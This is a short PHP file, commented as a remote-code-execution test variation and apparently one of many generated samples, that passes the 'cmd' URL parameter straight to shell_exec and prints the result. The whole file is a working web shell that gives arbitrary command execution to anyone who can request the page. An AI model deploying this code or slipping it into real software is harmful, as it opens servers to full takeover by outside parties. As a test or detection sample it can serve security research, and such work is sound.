<?php
// RCE test variation #1027
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>